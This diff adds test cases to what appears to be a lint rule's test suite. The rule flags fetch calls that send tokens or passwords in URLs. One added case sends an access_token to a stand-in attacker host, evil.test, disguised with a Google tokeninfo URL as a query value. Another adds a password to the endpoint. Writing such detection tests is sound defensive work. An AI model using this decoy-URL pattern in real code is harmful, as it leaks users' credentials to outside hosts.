@@ -36,6 +36,16 @@ ruleTester.run(
     ],
     invalid: [
       {
+        name: 'control: the Google URL is only a query value on another host',
+        code: "fetch('https://evil.test/?next=https://oauth2.googleapis.com/tokeninfo&access_token=abc');",
+        errors: [{ messageId: 'violationDetected' }],
+      },
+      {
+        name: 'control: only id_token and access_token are exempt on the endpoint',
+        code: "fetch('https://oauth2.googleapis.com/tokeninfo?id_token=abc&password=p');",
+        errors: [{ messageId: 'violationDetected' }],
+      },
+      {
         name: 'control: another host',
         code: "fetch('https://example.com/tokeninfo?id_token=abc');",
         errors: [{ messageId: 'violationDetected' }],
